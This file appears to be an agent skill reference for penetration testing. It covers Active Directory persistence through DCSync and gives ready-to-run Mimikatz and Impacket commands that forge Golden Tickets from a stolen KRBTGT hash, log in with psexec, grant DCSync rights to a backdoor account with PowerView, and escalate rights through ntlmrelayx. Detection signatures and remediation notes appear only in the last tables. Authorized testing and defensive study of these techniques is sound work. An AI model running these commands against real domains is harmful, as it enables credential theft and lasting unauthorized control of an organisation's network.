# conducting-domain-persistence-with-dcsync — 详细参考（由 SKILL.md 拆分）

### Phase 3: Golden Ticket Creation
1. Using Mimikatz with extracted KRBTGT hash:
   ```powershell
   # Create Golden Ticket
   mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local \
     /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
     /krbtgt:<krbtgt_ntlm_hash> /ptt"

   # Create with specific group memberships
   mimikatz.exe "kerberos::golden /user:fakeadmin /domain:domain.local \
     /sid:S-1-5-21-XXXXXXXXXX \
     /krbtgt:<krbtgt_ntlm_hash> \
     /groups:512,513,518,519,520 /ptt"
   ```
2. Using Impacket ticketer.py (Linux):
   ```bash
   # Create Golden Ticket
   ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-XXXXXXXXXX \
     -domain domain.local administrator

   # Use the ticket
   export KRB5CCNAME=administrator.ccache
   psexec.py -k -no-pass domain.local/administrator@DC01.domain.local
   ```

### Phase 4: Persistence via DCSync Rights
1. Grant DCSync rights to a controlled account for persistence:
   ```powershell
   # Using PowerView - Add DS-Replication-Get-Changes-All rights
   Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
     -PrincipalIdentity backdoor_user -Rights DCSync

   # Verify rights were added
   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
     Where-Object { $_.SecurityIdentifier -match "backdoor_user_SID" }
   ```
2. Using ntlmrelayx.py for automated DCSync rights escalation:
   ```bash
   # Relay authentication to add DCSync rights
   ntlmrelayx.py -t ldap://DC01.domain.local --escalate-user backdoor_user
   ```

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| Mimikatz | DCSync extraction, Golden Ticket creation | Windows |
| secretsdump.py | Remote DCSync (Impacket) | Linux (Python) |
| ticketer.py | Golden Ticket creation (Impacket) | Linux (Python) |
| PowerView | ACL enumeration and modification | Windows (PowerShell) |
| Rubeus | Kerberos ticket manipulation | Windows (.NET) |
| ntlmrelayx.py | DCSync rights escalation via relay | Linux (Python) |

## Critical Hashes to Extract

| Account | Purpose | Persistence Value |
|---------|---------|-------------------|
| krbtgt | Golden Ticket creation | Indefinite domain access |
| Administrator | Direct DA access | Immediate privileged access |
| Service accounts | Lateral movement | Service access across domain |
| Computer accounts | Silver Ticket creation | Service-level impersonation |

## Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| DrsGetNCChanges RPC calls from non-DC sources | Network monitoring for DRSUAPI traffic from unusual IPs |
| Event 4662 with Replicating Directory Changes GUIDs | Windows Security Log on DC (1131f6aa-/1131f6ad- GUIDs) |
| Event 4624 with Golden Ticket anomalies | Logon events with impossible SIDs or non-existent users |
| ACL modifications on domain root object | Event 5136 (directory service changes) |
| Replication traffic volume spike | Network baseline deviation monitoring |

## Validation Criteria

- [ ] Accounts with DCSync rights enumerated
- [ ] KRBTGT hash extracted via DCSync
- [ ] All domain credentials dumped successfully
- [ ] Golden Ticket forged and validated for DA access
- [ ] DCSync rights persistence mechanism established (if in scope)
- [ ] Access to Domain Controller validated with Golden Ticket
- [ ] Evidence documented with hash values and timestamps
- [ ] Remediation recommendations provided (double KRBTGT reset, ACL audit)
